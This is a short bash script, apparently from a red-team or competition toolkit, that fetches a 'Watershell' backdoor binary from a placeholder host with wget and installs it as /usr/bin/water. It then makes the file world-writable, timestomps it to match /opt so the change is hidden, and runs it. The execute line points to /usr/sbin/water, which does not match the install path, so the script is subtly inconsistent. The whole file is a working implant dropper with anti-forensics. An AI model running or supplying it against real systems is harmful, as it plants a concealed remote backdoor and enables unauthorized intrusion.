#!/bin/bash

#Download Watershell payload
wget http://IP/Beachhead_source/watershell-tcp/build/watershell_static_tcp_port_1337 -O /usr/bin/water

#Change permissions
chmod 777 /usr/bin/water

touch -r /opt /usr/bin/water

#Execute
/usr/sbin/water

